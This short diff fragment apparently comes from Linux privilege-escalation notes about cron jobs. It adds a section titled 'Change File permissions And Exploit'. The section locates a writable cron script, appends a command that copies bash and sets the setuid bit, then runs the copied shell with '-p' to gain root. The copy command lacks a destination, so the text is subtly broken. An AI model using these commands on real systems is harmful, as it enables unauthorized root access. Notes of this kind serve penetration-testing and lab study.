@@ -77,7 +77,11 @@ cat /etc/cron.deny*
         
         
         
+   ## Change File permissions And Exploit
    
+       locate overwrite.sh
+       echo 'cp /bin/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
+       /tmp/bash -p
    
    
    
